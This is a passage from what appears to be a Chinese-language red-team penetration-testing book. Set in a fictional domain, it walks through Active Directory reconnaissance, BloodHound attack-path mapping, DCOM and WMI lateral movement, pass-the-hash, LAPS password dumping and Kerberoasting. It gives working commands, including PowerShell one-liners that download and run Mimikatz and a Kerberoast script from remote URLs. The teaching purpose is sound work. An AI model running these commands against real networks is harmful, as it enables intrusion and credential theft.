  \ Active Directory。从任意加入了域的计算机上，攻击者可以运行`setspn.exe`文件来查询 AD。该文件是 Windows 系统的默认二进制程序存在于所有现代\
  \ Windows 系统中。\n\n*   `setspn` `-T` `[DOMAIN]` `-F` `-Q` `*/*`\n\n*   开关参数：\n  \
  \  *   `-T` = 在指定的域上执行查询\n    *   `-F` = 在 AD 林级别而不是域级别执行查询\n    *   `-Q` = 在每个目标域或林中执行\n\
  \    *   `*/*` = 获取所有信息\n\n我们从`setspn`能看出什么类型的信息呢？在下方的示例中运行`setspn`命令后，我们看到了在域控制器上运行的服务信息、工作站的信息以及我们还发现了一台名为\
  \ CSK-GITHUB 的服务器。在这个例子中可以看出该主机机器正在运行 HTTP 服务。如果这发生在不同的端口但仍使用相同协议，这些信息也会被列出。\n\n\
  ![images/00105.jpeg](img/00105.jpeg)\n\n`setspn`不仅会提供有关 AD 中的服务用户和所有主机名方面的有用信息，还会告诉我们系统上正在运行哪些服务甚至包括其端口号。既然我们可以直接从\
  \ AD 获取关于服务和端口的绝大多数信息，为什么还需要扫描网络呢？有些东西可以立即进行攻击吗？例如：Jenkins、Tomcat 还是 ColdFusion？\n\
  \n### 查询 Active Directory\n\n不知道我有多少次发现单个域用户帐户和密码，随后被告知这只是普通的域用户帐户没有其他权限无需担心。我们在打印机、共享自助服务工作站、明文文本文件（其中包含了服务的密码）、配置文件上发现了这类帐号，以及在\
  \ iPad 和网页应用中（将密码包含在页面源代码中），如此等等。但是面对一个没有任何其他组成员资格的普通域用户帐户，您能做什么呢？\n\n#### 获取 AD\
  \ 用户的更详细信息\n\n我们可以使用由@harmj0y 创建的工具 PowerView ([`bit.ly/2JKTg5d`](http://bit.ly/2JKTg5d))来为我们要做的所有肮脏工作提供帮助。PowerView\
  \ 是一款用于在 Windows 域中获取网络态势感知的 PowerShell 工具。它包含一系列纯 PowerShell 实现以替换各种`net *` Windows\
  \ 命令，并利用 PowerShell AD 钩子和底层 Win32 API 函数执行有用的 Windows 域功能 ([`bit.ly/2r9lYnH`](http://bit.ly/2r9lYnH))。作为攻击者，我们可以利用\
  \ PowerView 和 PowerShell 来查询 AD，这可以使用具有最低权限的`Domain Users`用户完成，甚至是在没有本地管理员权限的情况下进行。\n\
  \n让我们以这个低级用户的能获取的数据量为例。为了开始操作，我们已经让 Empire 运行中（您可以在 Metasploit、Cobalt Strike 或类似工具中进行复制），并且已经在受害者系统上执行了载荷。如果您以前从未配置过\
  \ Empire 请查看本书的\"Setup\"章节了解如何设置 Empiria 及其载荷。一旦我们的代理开始与命令与控制 (Command and Control)\
  \ 服务器通信，我们就可以输入`info`来了解关于受害者的信息。在这种情况下，我们已经攻破了一台运行完全修补版 Windows 10 系统的宿主机其用户名为\
  \ `neil.pawstrong`属于 cyberspacekitten 的域内。\n\n![images/00106.jpeg](img/00106.jpeg)\n\
  \n\n\n\n\n接下来，我们想在未引起太多怀疑的情况下从域查询信息。我们可以使用 Empire 中的 PowerView 工具获取信息。PowerView\
  \ 查询域控制器（DC）以获取有关用户、组、计算机等的信息。我们将使用的 PowerView 功能将仅查询域控制器，并且看起来应该像正常流量。\n\nEmpire\
  \ 中有哪些可用的模块可用于态势感知？\n\n我们可以从名为`get_user`的 PowerView 脚本开始。`Get_user`会查询指定域中给定用户或多个用户的信息。使用默认设置，我们可以获取\
  \ AD 中所有用户的详细信息及其关联信息。\n\n模块：`situational_awareness/network/powerview/get_user`\n\
  \n在上述输出中，我们可以看到其中一名用户的信息（Purri Gagarin）。我们获取了什么类型的信息？我们可以看到他们的`samaccountname`或`username`、密码更改时间、对象类别、所属组（membersof）、最后登录时间及更多内容。通过这个基本的用户导出，我们可以从目录服务获取大量信息。我们还能获取其他什么类型的信息？\n\
  \n模块：`situational_awareness/network/powerview/get_group_member`\n\n`get_group_member`返回给定组的成员，并带有“递归”选项以查找所有有效组成员。我们可以使用\
  \ AD 查找特定组的特定用户。例如，使用以下 Empire 设置，我们可以搜索所有域管理员（Domain Admins）及属于域管理员组的组：\n\n*  \
  \ info\n*   set Identity `Domain Admins`\n*   set Recurse `True`\n*   set FullData\
  \ `True`\n*   execute\n\n现在，我们有了用户、组、服务器和服务的列表。这将有助于我们映射哪些用户拥有哪些权限。然而，我们仍然需要有关工作站和系统的详细信息。这可能包括版本、创建日期、使用情况、主机名等。我们可以在名为`get_computer`的模块上获取此信息。\n\
  \n模块：`situational_awareness/network/powerview/get_computer`\n\n描述：`get_computer`模块查询域中的当前计算机对象。\n\
  \n让`get_computer`查询域控制器，我们获得了什么信息？嗯，我们看到我们获取了关于机器、创建时间、DNS 主机名、可分辨名称等的信息。作为攻击者，最有用的侦察细节之一是获取操作系统类型和操作系统版本。在这种情况下，我们可以看到这些系统运行在\
  \ Windows 10 和 Build 16299。我们可以利用这些信息，查看操作系统的发布时间以及它们是否在微软的发布信息页面`https://technet.microsoft.com/en-us/windows/release-info.aspx`得到积极修补。\n\
  \n### BloodHound/SharpHound\n\n我们如何利用侦察阶段收集的所有信息来创建一条利用路径？我们如何轻松快速地将谁有权访问什么进行关联？在过去，我们通常尝试攻击一切以达到目的，但这总是增加了被发现的可能性。Andrew\
  \ Robbins、Rohan Vazarkar 和 Will Schroeder 创建了一种名为 BloodHound/SharpHound 的最佳关联工具。根据他们的\
  \ Github 页面，\"BloodHound 使用图论来揭示 Active Directory 环境中隐藏的且通常是意外的关系。攻击者可以使用 BloodHound\
  \ 轻松识别高度复杂的攻击路径，否则不可能快速识别这些路径。防御者可以使用 BloodHound 识别并消除这些相同的攻击路径。蓝色和红色团队都可以使用 BloodHound\
  \ 轻松深入了解 Active Directory 环境中的权限关系。[`https://github.com/BloodHoundAD/BloodHound`]`\n\
  \nBloodHound 通过在受害系统上运行采集器（Ingestor）来工作，然后查询 Active Directory（类似于我们之前手动所做的操作）以获取用户、组和主机信息。然后采集器将尝试连接到每个系统以枚举已登录用户、会话和权限。当然，这会对网络产生很大的噪音。对于中大型组织，在使用默认设置（可修改）的情况下，使用\
  \ SharpHound 连接每个主机系统并查询信息可能需要不到 10 分钟。注意，由于这会触碰网络上的每个域加入的系统，它可能会让你暴露。BloodHound\
  \ 中有一个隐身选项，仅查询 Active Directory 而不连接到每个主机系统，但输出内容非常有限。\n\n目前有两个不同的版本（我很确定旧版不久将被移除）：\n\
  \n*   在 Empire 内部，你可以使用模块：\n\n    *   `usemodule` situational_awareness/network/bloodhound\n\
  \n    *   这仍然使用旧的 PowerShell 版本，非常慢\n\n*   更好的选择是 SharpHound。SharpHound 是原始 BloodHound\
  \ 采集器的 C# 版本。它速度快且稳定得多。它可以作为独立的二进制文件使用，或者作为 PowerShell 脚本导入。SharpHound PowerShell\
  \ 脚本将使用反射和`assembly.load`将编译好的 BloodHound C# 采集器加载到内存中。\n\n    *   `https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors`\n\
  \n要运行 BloodHound/SharpHound 采集器，您可能需要指定多个`CollectionMethods`：\n\n*   Group - 收集组成员关系信息\n\
  *   LocalGroup - 收集计算机的本地管理员信息\n*   Session - 收集计算机的会话信息\n*   SessionLoop - 连续收集会话信息直到被终止\n\
  *   Trusts - 枚举域信任数据\n*   ACL - 收集访问控制列表（ACL）数据\n*   ComputerOnly - 收集本地管理员和会话数据\n\
  *   GPOLocalGroup - 使用组策略对象（GPO）收集本地管理员信息\n*   LoggedOn - 使用特权方法收集会话信息（需要管理员！）\n\
  *   ObjectProps - 收集用户和计算机的节点属性信息\n*   Default - 收集组成员关系、本地管理员、会话和域信任\n\n要运行 Blood/SharpHound，在主机系统上：\n\
  \n*   运行 PowerShell 并导入 BloodHound.ps1 或 SharpHound.ps1 之一：\n\n    *   `Invoke-Bloodhound`\
  \ -CollectionMethod Default\n\n    *   `Invoke-Bloodhound` -CollectionMethod ACL,\
  \ ObjectProps, Default -CompressData -RemoveCSV -NoSaveCache\n\n*   运行可执行文件：\n\n\
  \    *   `SharpHound.exe` -c Default, ACL, Session, LoggedOn, Trusts\n\n一旦 BloodHound/SharpHound\
  \ 完成，四个文件将被下载到受害系统。获取这些文件并将其移至您的 Kali 盒子。接下来，我们需要启动我们的 Neo4j 服务器并导入此数据以构建关联图。\n\n\
  启动 BloodHound\n\n1.  `apt-get install bloodhound`\n2.  `neo4j console`\n3.  打开浏览器访问`http://localhost:7474`\n\
  \n    1.  连接到`bolt://localhost:7687`\n    2.  用户名：neo4j\n    3.  密码：neo4j\n    4.\
  \  更改密码\n\n4.  在终端中运行 BloodHound：\n\n    1.  `bloodhound`\n    2.  数据库 URL: `bolt://127.0.0.1:7687`\n\
  \    3.  用户名：neo4j\n    4.  密码：新密码\n\n5.  加载数据：\n\n    1.  右侧有一个“上传数据”按钮\n    2.\
  \  上传 `acls.csv`、`group_membership.csv`、`local_admin.csv`和`sessions.csv`\n\n\n\n\
  \n-   如果没有可用于测试的域名，我已在下方上传了四个 Bloodhound 文件[`https://github.com/cyberspacekittens/bloodhound`]，以便您重复练习。一旦进入\
  \ Bloodhound 并完成所有数据的导入，我们可以进入\"Queries\"查看\"Find Shortest Paths to Domain Admin\"\
  。我们还可以选择特定用户，查看是否能映射到该特定用户或组的路径。在我们的案例中，我们首先破坏的第一个盒子是`NEIL.PAWSTRONG@CYBERSPACEKITTENS.LOCAL`。在搜索栏中插入该用户，点击\"\
  Pathfinding\"按钮，输入\"Domain Admin\"（或其他任何用户），查看是否能在这两个对象之间建立路由路径。\n\n![images/00111.jpeg](img/00111.jpeg)\n\
  \n正如从 Neil 的机器上所看到的，我们可以一直将路径导向 CSK-Lab。一旦进入实验室盒子，会有一个名为`Purri`的用户，他是`HelpDesk`组的成员。\n\
  \n![images/00112.jpeg](img/00112.jpeg)\n\n如果我们要破坏`HelpDesk`组，我们可以转向 Chris 的系统（他也在其中，当前登录用户为`Elon\
  \ Muskkat`）。如果我们要将进程迁移或窃取其明文密码，我们可以提升到`Domain Admin`级别！\n\n在大型网络中，我们发现 Bloodhound\
  \ 查询存在局限性以及搜索问题。使用`Neo4j`的一大好处是，它允许通过其自有语言`Cypher`执行原始查询。关于`Cypher`自定义查询的深入探讨可在此处找到：[`https://blog.cptjesus.com/posts/introtocypher`]。\n\
  \n我们可以添加哪些自定义查询？嗯，[`@porterhau5`](https://github.com/porterhau5)在扩展 Bloodhound 以追踪和可视化您的破坏方面取得了一些巨大的进展。在此处查看他们的文章：[`https://porterhau5.com/blog/extending-bloodhound-track-and-visualize-your-compromise/`]。\n\
  \n从高层角度来看，[`@porterhau5`](https://github.com/porterhau5)添加了标记被破坏主机的想法，以帮助更好地在环境中进行横向移动。例如，在这个虚构的场景中，我们通过鱼咬用户`niel.pawstrong`来破坏初始用户。使用`Cypher`语言和\
  \ Bloodhound 应用程序的\"Raw Query\"功能，我们可以运行这些查询：\n\n*   在被破坏的系统上添加`Owned`标签：\n\n  \
  \  ```\n    MATCH (n) WHERE n.name=\"NEIL.PAWSTRONG@CYBERSPACEKITTENS.LOCAL\" SET\
  \ n.owned=\"phish\", n.wave=1\n    ```\n\n*   运行一个查询以显示所有被鱼咬的拥有系统\n\n    ```\n \
  \   MATCH (n) WHERE n.owned=\"phish\" RETURN n\n    ```\n\n现在，我们可以为 Bloodhound 添加一些自定义查询。在\
  \ Bloodhound 的\"Queries\"标签页上，滚动到底部，点击\"Custom Queries\"旁边的编辑按钮。用以下内容替换所有文本：[`https://github.com/porterhau5/BloodHound-Owned/blob/master/customqueries.json`]\n\
  \n保存后，我们应该会创建更多的查询。我们现在可以点击\"从拥有节点到 Domain Admin 的最短路径\"。\n\n![images/00113.jpeg](img/00113.jpeg)\n\
  \n如果您想更深入地研究这一点，请查看 [`@porterhau5`](https://github.com/porterhau5)分叉的 Bloodhound\
  \ 版本。它对标记被破坏的机器做得更漂亮，并允许更多的自定义功能：[`https://github.com/porterhau5/BloodHound-Owned`]。\n\
  \n到目前为止，没有扫描，我们已经能够大量获取关于组织的信息。这一切都是以本地`AD`用户（`domain users`）的身份进行的，而且大部分网络流量看起来也不太可疑。如你所见，我们能够在没有任何本地管理员权限或本地系统管理权限的情况下完成所有操作。\n\
  \n### Advanced ACL/ACE Bloodhound\n\n使用 Bloodhound 的集合方法`Access Control List`（`ACL`）时，我们的脚本将查询`AD`以收集用户/对象的访问控制权限。我们从`Access\
  \ Control Entries`（`ACEs`）收集的信息描述了允许和拒绝权限的用户、组和计算机。发现和滥用`ACEs`本身就可以成为一整本专著，但这里有一些不错的开始资源：\n\
  \n*   `BloodHound` 1.3 – The `ACL`攻击路径更新\n    *   [`https://wald0.com/?p=112`]\n\
  *   `Introducing` the `Adversary Resilience`方法论\n    *   [`http://bit.ly/2GYU7S7`]\n\
  \n当我们将`ACL`数据导入 Bloodhound 时，我们在寻找什么？Bloodhound 识别出`ACEs`中可能存在弱点的地方。这包括谁有权更改/重置密码，将成员添加到组中，更新对象（如其他用户的`scriptPath`），更新对象或在对象上写入新的`ACE`等。\n\
  \n你可能会如何利用这一点？当破坏盒子和获取额外凭据时，我们可以针对路径，找到能够重置密码或修改`ACE`权限的用户。这将导致找到通往`Domain Admin`或特权账户的创造性路径，甚至允许设置后门以备后用。进一步了解这些滥用类型的绝佳资源是：[`Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors`](http://ubm.io/2GI5EAq)演示文稿。\n\
  \n### 横向移动 - 迁移进程\n\n在具有多个用户的盒子上，常见的做法是制作令牌或迁移不同用户的令牌。这并非新事物，但在环境中进行横向移动时经常被大量使用。通常来自\
  \ Bloodhound 输出或共享工作站，作为攻击者，我们需要能够在我们受害者系统上冒充其他用户。\n\n使用我们拥有的许多工具可以实现这一点。在`Metasploit`方面，我们都应该对`Post\
  \ Exploitation incognito`（[`https://www.offensive-security.com/metasploit-unleashed/fun-incognito/`]）相当熟悉，以窃取令牌。在`Empire`中，我们可以使用`steal_tokens`在该系统上冒充用户。我注意到有时窃取令牌会破坏我们的外壳。为了避免这种情况，我们可以将一个新代理注入到另一个用户拥有的运行进程中。\n\
  \n在下面的图片中，我们鱼咬了一个运行我们恶意软件的员工。这使我们能够在属于该受害者用户（`neil.pawstrong`）的进程中运行。一旦进入该用户的盒子，我们就转向了`Buzz\
  \ Clawdrin`的系统，并使用`WMI`（Windows Management Instrumentation）启动了新代理。问题在于，我们仍在我们的初始受害者`neil.pawstrong`的进程下，因为我们使用缓存凭据在`Buzz`的宿主机上启动了一个外壳。因此，与其窃取令牌，我们应该使用`Empire`的`psinject`功能。\n\
  \n`PSInject`在 Empire 中“能够将一个代理注入到另一个进程中，使用`ReflectivePick`将`.NET`通用语言运行时加载到进程中并执行特定的\
  \ PowerShell 命令，所有这一切都不需要启动新的`powershell.exe`进程！” [`http://bit.ly/2HDxj6x`] 我们使用它启动一个新代理，运行在`Buzz.Clawdrin`拥有的进程下，以便我们现在可以获取他的访问权限。\n\
  \n![images/00114.jpeg](img/00114.jpeg)\n\n### 从您初始主机向外横向移动\n\n现在，您已经找到可以移动到那些系统的路径，要获取代码执行到这些系统有哪些选项？最基本的方法是使用我们当前`Active\
  \ Directory`用户的权限来控制另一个系统。例如，我们可能会看到一个经理对其下属的机器拥有完全访问权限，一台有多个用户拥有管理权限的会议室/实验室机器，内部系统的配置错误，或看到有人手动将用户添加到该\
  \ PC 的本地管理员组。这些都是我们看到用户远程访问网络上其他工作站的一些方式。一旦在受感染的机器上，我们可以从 Bloodhound 获取结果，或者重新扫描网络，查看我们可以本地访问哪些机器：\n\
  \n*   `Empire`模块：`situational_awareness/network/powerview/find_localadmin_access`\n\
  *   `Metasploit`模块：[`http://bit.ly/2JJ7ILb`]\n\n`Empire`的`find_localadmin_access`将查询`Active\
  \ Directory`以获取所有主机名，并尝试连接到它们。这绝对是一个嘈杂的工具，因为它需要连接到每个主机并验证其是否为本地的管理员。\n\n![images/00115.jpeg](img/00115.jpeg)\n\
  \n\n\n\n# 正如我们所见，`find_localadmin_access` 模块识别出我们被利用的用户确实拥有访问 `buzz.cyberspacekittens.local`\
  \ 主机的权限。\n\n为了双重确认我们拥有访问权，我通常会执行非交互式的远程命令，例如 `dir \\\\[remote system]\\C$`，并检查我们是否对\
  \ C 盘拥有读写权限。\n\n在横向移动方面，有几个选项可供选择。让我们先查看 Empire 中提供的选项，因为它们通常是最常见的（直接从 Empire 中提取）：\n\
  \n*   `inveigh_relay`：Inveigh 的 SMB 中继功能。该模块可用于将传入的 HTTP/Proxy NTLMv1/NTLMv2 身份验证请求中继到\
  \ SMB 目标。如果身份验证成功中继且账号具有正确的权限，则会在目标中以 PsExec 风格执行指定命令或 Empire 启动器。\n\n*   `invoke_executemsbuild`：此函数使用\
  \ MSBuild 和内联任务在本地/远程主机上执行 PowerShell 命令。如果提供凭据，则会将默认的管理共享挂载到本地。此命令将在 MSBuild.exe\
  \ 进程的上下文中执行，而无需启动 PowerShell.exe。\n\n*   `invoke_psremoting`：使用 PSRemoting 在远程主机上执行加载阶段（stager）。只要受害者启用了\
  \ PSRemoting（并非总是可用），我们就可以通过此服务执行 PowerShell。\n\n*   `invoke_sqloscmd`：使用 `xp_cmdshell`\
  \ 在远程主机上执行命令或加载阶段。古老的 `xp_cmdshell` 回来了！\n\n*   `invoke_wmi`：使用 WMI 在远程主机上执行加载阶段。WMI\
  \ 几乎总是启用的，这是执行 PowerShell 负载的绝佳方式。\n\n*   `jenkins_script_console`：向具有未经认证访问脚本控制台权限的\
  \ Windows Jenkins 服务器部署 Empire 代理。正如我们所知，Jenkins 服务器很常见，而没有凭据通常意味着可以通过 `/script`\
  \ 端点进行完全远程代码执行（RCE）。\n\n*   `invoke_dcom`：通过 DCOM（http://bit.ly/2qxq49L）上的 MMC20.Application\
  \ COM 对象在远程主机上调用命令。允许我们在不使用 PsExec、WMI 或 PSRemoting 的情况下进行跳转（pivot）。\n\n*   `invoke_psexec`：使用\
  \ PsExec 类型功能在远程主机上执行加载阶段。这是使用 PsExec 移动文件并执行旧式方法。这可能会触发警报，但如果没有其他可用方法，这仍然是一种有效的方法。\n\
  \n*   `invoke_smbexec`：使用 SMBExec.ps 在远程主机上执行加载阶段。 Instead of using PsExec，我们可以使用\
  \ Samba 工具进行类似的攻击。\n\n*   `invoke_sshcommand`：通过 SSH 在远程主机上执行命令。\n\n*   `invoke_wmi_debugger`：使用\
  \ WMI 将远程机器上目标二进制文件的调试器设置为 `cmd.exe` 或加载阶段。使用调试工具如 `sethc`（粘滞键）来执行我们的代理。\n\n*  \
  \ `new_gpo_immediate_task`：构建一个“立即”执行的 schtask，并通过指定的组策略对象（GPO）推送。如果您的用户账号有权修改 GPO，该模块允许您将一个“立即”安排的任务推送到您编辑的\
  \ GPO 中，从而实现在应用了该 GPO 的系统上执行代码。\n\n[[`www.harmj0y.net/blog/empire/empire-1-5/`](http://www.harmj0y.net/blog/empire/empire-1-5/)]\n\
  \n这只是最常见和最容易实现的横向移动技术中的一些。在本书稍后的内容中，我们将讨论一些较少见的绕网技术。在大多数网络中，Windows 管理工具包（WMI）通常是启用的，因为管理工作站需要它。因此，我们可以使用\
  \ `invoke_wmi` 进行横向移动。由于我们使用的是缓存的凭据，且我们的账号拥有访问远程主机的权限，因此我们无需知道用户的凭据。\n\n## 在远程系统上执行\n\
  \n*   `usemodule` lateral_movement/invoke_wmi\n\n*   设置您即将攻击的计算机：\n\n    *   `set`\
  \ ComputerName buzz.cyberspacekittens.local\n\n*   定义要使用的监听器：\n\n    *   `set` Listener\
  \ http\n\n*   远程连接到该主机并执行您的恶意软件：\n\n    *   `execute`\n\n*   与新代理交互\n\n    *   `agents`\n\
  \    *   `interact` <代理名称>\n\n*   `sysinfo`\n\n### 使用 DCOM 进行横向移动\n\n在主机内部网中，一旦入侵主机，就有多种方式可以横向移动。如果被利用的账号拥有访问权限，或者您能够使用捕获的凭据创建令牌，我们可以使用\
  \ WMI、PowerShell 远程管理或 PsExec 生成不同的 shell。如果这些方法受到监控怎么办？我们可以利用一些有趣的 Windows 功能，即分布式组件对象模型（DCOM）。DCOM\
  \ 是 Windows 的一项功能，用于在不同远程计算机上的软件组件之间进行通信。\n\n您可以使用以下 PowerShell 命令列出机器上的所有 DCOM\
  \ 应用程序：`Get-CimInstance Win32_DCOMApplication`\n\n根据 @enigma0x3 的研究（https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/），他识别出存在多个对象（例如\
  \ `ShellBrowserWindow` 和 `ShellWindows`），这些对象允许在受害主机上远程执行代码。当您列出所有 DCOM 应用程序（如上所示）时，您会遇到一个\
  \ `ShellBrowserWindow` 对象，其 CLSID 为 `C08AFD90-F2A1-11D1-8455-00A0C91F3880`。确定了该对象后，只要我们的账号拥有访问权限，我们就可以滥用此功能在远程工作站上执行二进制文件：\n\
  \n*   `powershell`\n*   `$([activator]::CreateInstance([type]::GetTypeFromCLSID(\"\
  C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"buzz.cyberspacekittens.local\"))).Navigate(\"\
  c:\\windows\\system32\\calc.exe\")`\n\n这仅在系统本地执行文件，我们无法向可执行文件包含任何命令行参数（因此无法使用 `cmd\
  \ /k` 风格的攻击）。相反，我们可以从远程系统调用文件并执行它们，但请注意用户会收到弹出警告。在这种情况下，我目前位于受害主机 `neil.cyberspacekittens.local`\
  \ 上，该主机对名为 `buzz` 的远程工作站拥有管理员访问权限。我们将共享 Neil 工作ستان上的一个文件夹并托管我们的恶意负载。接下来，我们可以调用\
  \ DCOM 对象在远程受害者（buzz）机器上执行我们托管的文件。\n\n$`([activator]::CreateInstance([type]::GetTypeFromCLSID(\"\
  C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"buzz.cyberspacekittens.local\"))).Navigate(\"\
  \\\\neil.cyberspacekittens.local\\Public\\adobeupdate.exe\")`\n\n正如您在下一张图片中看到的，在\
  \ Buzz 的机器上显示了一个关于运行 adobeupdate.exe 文件的弹出窗口。虽然大多数用户会点击并运行它，但这可能会导致我们被抓获。\n\n因此，避免此问题的更佳路线是先将文件传输过去（类似于挂载受害者的驱动器），然后再使用\
  \ DCOM 执行该文件。@enigma0x3 甚至进一步利用这一点，并用 Excel 宏滥用了 DCOM。首先，我们需要在自己的系统上创建恶意 Excel 文档，然后使用\
  \ PowerShell 脚本（https://bit.ly/2pzJ9GX）在受害主机上执行此.xls 文件。\n\n需要注意的是，存在大量的其他 DCOM\
  \ 对象可以从系统中获取信息，甚至可能启动/停止服务等。这些无疑将为关于 DCOM 功能的进一步研究提供极好的起点。\n\n资源：\n\n*   https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/\n\
  *   https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/\n\
  *   https://www.cybereason.com/blog/dcom-lateral-movement-techniques\n\n### Pass-the-Hash\n\
  \n本地管理员账号的 Pass-The-Hash (PTH) 旧方法在很大程度上已开始消失。虽然并未完全消失，让我们快速回顾一下。PTH 攻击利用 Windows\
  \ NTLM 哈希对系统进行身份验证，而不是使用用户的凭据。为什么这很重要？首先，使用 Mimikatz 等工具可以轻松恢复哈希，可以提取本地账号（但需要本地管理员访问权限），可以从域控制器中恢复（不是明文密码），等等。\n\
  \n\n\n\n`PTH`（Pass-the-Hash）最基本的用途是攻击本地管理员。这种情况通常比较少见，因为默认情况下，本地管理员账户现在已被禁用，并且出现了新的安全功能，例如本地管理员密码解决方案（LAPS），它为每台工作站生成随机密码。在过去，获取一台工作站上本地管理员账户的哈希值在组织内是相同的，这意味着一次入侵就会导致整个公司被攻破。\n\
  \n当然，这样做的前提是：你必须是系统上的本地管理员，本地管理员账户 `administrator` 已启用，且它是 RID 为 `500` 的账户（这意味着它必须是原始的管理员账户，而不能是新创建的本地管理员账户）。\n\
  \n命令：`shell net user administrator`\n\n```\nUser name             Administrator\n\
  Full Name\nComment             Built-in account for administering the computer/domain\n\
  User's comment\n\nCountry/region code 000 (System Default)\nAccount active     \
  \     Yes\nAccount expires         Never\n```\n\n如果我们看到该账户处于活动状态，我们可以尝试从本地计算机中提取所有哈希值。请记住，这不会包括任何域哈希值：\n\
  \n*   Empire 模块：`powershell/credentials/powerdump`\n*   Metasploit 模块：`http://bit.ly/2qzsyDI`\n\
  \n示例：\n\n*   (Empire: `powershell/credentials/powerdump`) > `execute`\n*   作业已启动：`93Z8PE`\n\
  \n输出：\n\n*   `Administrator:500: aad3b435b51404eeaad3b435b51404ee:3710b46790763e07ab0d2b6cfc4470c1:::`\n\
  *   `Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`\n\
  \n我们可以使用 Empire (`credentials/mimikatz/pth`)，或者启动受信任的 `psexec`，提交我们的哈希值并执行自定义负载，如下图所示：\n\
  \n![](img/00121.jpeg)\n\n如前所述，这是旧式的横向移动方法，且较为罕见。如果你仍然试图利用本地管理员账户，但身处拥有 LAPS（本地管理员密码解决方案）的环境中，你可以使用几种不同的工具从活动目录中提取它们。这假设你已经拥有特权的域管理员或帮助台类型的账户：\n\
  \n*   `https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/enum_laps.rb`\n\
  *   `ldapsearch -x -h 10.100.100.200 -D \"elon.muskkat\" -w password -b \"dc=cyberspacekittens,dc=local\"\
  \ \"(ms-MCS-AdmPwd=*)\" ms-MCS-AdmPwd` [https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/]\n\
  \n这是一种在不暴露你的帮助台用户账户的情况下继续横向移动的好方法。\n\n### 从服务账户获取凭据\n\n如果你发现自己处于以下场景：你是受限用户，无法从内存中提取密码，且在主机系统上尝试密码失败……接下来该怎么办呢？嗯，我最喜欢的一种攻击称为\
  \ Kerberoasting。\n\n我们都清楚 NTLM 存在缺陷，因为它使用无盐单向哈希、重放攻击以及其他传统问题，这也是许多公司转向 Kerberos\
  \ 的原因。众所周知，Kerberos 是一种用于在计算机网络上验证服务请求的安全方法。我们不会深入探讨 Windows 中 Kerberos 的实现。但是，你应该知道，域控制器通常充当票证授予服务器；网络上的用户可以请求票证授予票证以访问资源。\n\
  \n什么是 Kerberoast 攻击？作为攻击者，我们可以为之前获取的目标服务账户的任何 SPN（服务主体名称）请求 Kerberos 服务票证。漏洞在于，当从域控制器请求服务票证时，该票证是使用关联的服务用户的\
  \ NTLM 哈希值加密的。由于任何用户都可以请求任何票证，这意味着，如果我们能猜测到关联服务用户 NTLM 哈希值（即加密票证的哈希值）对应的密码，我们就知道了实际服务账户的密码。这听起来可能有点令人困惑，让我们通过一个示例来逐步解释。\n\
  \n与之前所做的类似，我们可以列出所有 SPN 服务。这些是我们即将提取所有 Kerberos 票证的服务账户：\n\n*   `setspn -T cyberspacekittens.local\
  \ -F -Q */*`\n\n我们可以针对单个用户 SPN，或者将所有用户 Kerberos 票证提取到我们的用户内存中：\n\n*   针对单个用户：\n\
  \    *   `powershell Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken\
  \ -ArgumentList \"HTTP/CSK-GITHUB.cyberspacekittens.local\"`\n*   将所有用户票证提取到内存中\n\
  \    *   `powershell Add-Type -AssemblyName System.IdentityModel; IEX (New-Object\
  \ Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1\"\
  ) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken\
  \ -ArgumentList $_.ServicePrincipalName}catch{}}`\n*   当然，你也可以使用 PowerSploit 做到这一点：\n\
  \    *   `https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/`\n\
  \n![](img/00122.jpeg)\n\n如果成功，我们将一个或多个不同的 Kerberos 票证导入到受害者计算机的内存中。现在我们需要一种方法来提取这些票证。为此，我们可以使用经典的\
  \ Mimikatz Kerberos 导出功能：\n\n*   `powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2qx4kuH');\
  \ Invoke-Mimikatz -Command '\"\"\"kerberos::list /export\"\"\"'`\n\n![](img/00123.jpeg)\n\
  \n一旦我们导出了票证，它们将驻留在受害者计算机上。在开始破解之前，我们必须从他们的系统中下载这些票证。请记住，票证是使用服务账户的 NTLM 哈希值加密的。因此，如果我们能猜出该\
  \ NTLM 哈希值，我们就能读取票证，并进而知道服务账户的密码。破解账户最简单的方法是使用名为 `tgsrepcrack` 的工具（JTR 和 Hashcat\
  \ 也支持破解 Kerberoast，我们稍后会讨论）。\n\n*   使用 Kerberoast 破解票证：\n    *   `cd /opt/kerberoast`\n\
  \    *   `python tgsrepcrack.py [password wordlist] [kirbi tickets - *.kirbi]`\n\
  \n![](img/00124.jpeg)\n\n在这种情况下，服务账户 `csk-github` 的密码是 “P@ssw0rd!”\n\n当然，Empire\
  \ 中有一个 PowerShell 模块可以为我们完成所有繁重的工作。该模块位于 `powershell/credentials/invoke_kerberoast`\
  \ (https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1)。你可以将结果输出为\
  \ John the Ripper 或 Hashcat 格式以便破解密码。我以前在非常大的环境中运行 PowerShell 脚本时遇到过一些问题，因此回退方案是使用\
  \ PowerShell 和 Mimikatz 将所有票证提取下来。\n\n![](img/00125.jpeg)\n\n## 转储域控制器哈希值\n\n一旦我们获得了域管理权限，从域控制器（DC）提取所有哈希值的旧方法是在域控制器上运行命令，并使用卷影副本（Shadow\
  \ Volume）或原始复制技术来获取 `Ntds.dit` 文件。\n\n### 审查卷影副本技术\n\n由于我们确实拥有文件系统访问权限并在域控制器上可以运行命令，作为攻击者，我们希望抓取存储在\
  \ `Ntds.dit` 文件中的所有域哈希值。不幸的是，该文件一直在被读取/写入，即使是系统管理员也无法直接读取或复制该文件。幸运的是，我们可以利用 Windows\
